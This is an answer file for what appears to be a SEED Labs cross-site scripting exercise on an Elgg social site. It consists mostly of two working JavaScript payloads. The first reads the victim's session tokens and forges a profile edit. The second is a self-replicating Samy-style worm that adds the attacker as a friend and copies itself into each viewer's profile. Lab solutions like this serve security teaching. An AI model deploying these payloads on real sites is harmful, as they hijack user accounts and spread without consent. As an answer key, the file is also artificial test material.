# XSS solutions

1. Try it and see the results ;)
2. Edit the HTML in the Samy Profile using:

```html
<script type="text/javascript">
    window.onload = function() {
    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    //and Security Token __elgg_token
    var userName="&name="+elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    //Construct the content of your url.

    var samyGuid="59"
    var description="&description=hacked by samy";
    var content=token+ts+userName+description+guid;
    var sendurl="/action/profile/edit";
    if(elgg.session.user.guid != samyGuid) {
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send(content);
        }
    }
</script>
```

3. To become the victim's friend use the code and post it as above in the AboutMe of Samy:

```html
<script id="worm" type="text/javascript">
    window.onload = function() {

        // add friend
        var Ajax1=null;
        
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token
        var userName="&name="+elgg.session.user.name;
        var guid="&guid="+elgg.session.user.guid;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;

        //Construct the HTTP request to add Samy as a friend.
        var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token; 

        //Create and send Ajax request to add friend
        Ajax1=new XMLHttpRequest();
        Ajax1.open("GET", sendurl, true);
        Ajax1.send();

        // get the worm code
        var headerTag = "<p><script id=\"worm\" type=\"text/javascript\">"; 
        var jsCode = document.getElementById("worm").innerHTML;          
        var tailTag = "</" + "script></p>";                                  
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); 

        //Construct the content of your url.
        var content=token+ts+guid+userName+"&description="+wormCode;

        var samyGuid="59";
        var sendurl="http://www.seed-server.com/action/profile/edit";

        if(elgg.session.user.guid != samyGuid) {                   
            //Create and send Ajax request to modify profile
            var Ajax2=null;
            Ajax2=new XMLHttpRequest();
            Ajax2.open("POST", sendurl, true);

            Ajax2.setRequestHeader("Content-Type", 
                                  "application/x-www-form-urlencoded");
            Ajax2.send(content);
        }
    }
</script>
```

See the propagation of the famous Samy worm.